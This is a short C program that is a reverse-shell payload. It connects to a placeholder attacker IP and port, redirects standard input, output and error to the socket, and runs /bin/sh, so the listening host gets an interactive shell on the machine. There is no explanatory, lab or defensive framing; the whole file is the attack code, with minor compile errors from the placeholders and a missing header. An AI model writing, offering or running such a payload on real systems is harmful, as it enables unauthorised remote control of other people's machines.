#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>

int main() {
    int sockfd;
    struct sockaddr_in server;

    // Set your IP address and port number
    char* ip = "your_ip_address";
    int port = your_port_number;

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    // Connect to the remote host
    connect(sockfd, (struct sockaddr*)&server, sizeof(server));

    // Redirect input, output, and error streams to the socket
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    // Execute the shell
    execve("/bin/sh", NULL, NULL);

    return 0;
}

